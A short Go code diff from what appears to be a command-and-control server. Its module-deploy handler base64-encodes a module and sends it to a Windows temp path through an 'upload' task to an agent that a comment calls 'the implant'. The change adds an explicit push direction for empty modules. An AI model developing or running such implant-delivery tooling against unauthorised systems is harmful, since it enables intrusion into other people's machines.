@@ -196,7 +196,9 @@ func (s *Server) handleModulesDeploy(c *gin.Context) {
 		remotePath = `C:\Windows\Temp\` + safe
 	}
 	b64 := base64.StdEncoding.EncodeToString(data)
-	task := s.issueAgentTask(c, id, TaskSpec{Type: "upload", Command: remotePath, Path: remotePath, Data: b64})
+	// Explicit direction: an empty payload (empty module) must still be read
+	// as a server→agent push by the implant, not inferred from Data.
+	task := s.issueAgentTask(c, id, TaskSpec{Type: "upload", Command: remotePath, Path: remotePath, Data: b64, Direction: "push"})
 	if task == nil {
 		return
 	}
